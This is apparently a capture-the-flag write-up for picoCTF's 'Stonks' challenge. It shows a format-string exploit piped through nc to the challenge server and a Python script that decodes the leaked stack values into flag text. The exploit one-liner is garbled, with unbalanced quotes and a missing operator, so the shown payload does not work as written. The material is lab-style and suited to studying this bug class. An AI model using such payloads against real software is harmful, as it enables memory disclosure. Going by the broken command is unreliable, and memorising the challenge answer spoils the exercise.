# Stonks
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure!
vuln.c nc mercury.picoctf.net 33411


## Walkthru
Compiling with gcc shows you where the vulnerability is.

```shell
python -c 'print 1; print 40 " "%p|"' | nc mercury.picoctf.net 33411
```

```python
s= '99f83f0|804b000|80489c3|f7f22d80|ffffffff|1|99f6160|f7f30110|f7f22dc7|0|99f7180|2|99f83d0|99f83f0|6f636970|7b465443|306c5f49|345f7435|6d5f6c6c|306d5f79|5f79336e|63343261|36613431|ffb2007d|f7f5daf8|f7f30440|f3e05200|1|0|f7dbfce9|f7f310c0|f7f225c0|f7f22000|ffb2a348|f7db068d|f7f225c0|8048eca|ffb2a354|0|f7f44f09|804b000'
res = ''
for i in s.split('|'):
	if len(i) == 8:
		a = bytearray.fromhex(i)
		for b in reversed(a):
			if b > 32 and b < 128:
				res += chr(b)
print(res)
```
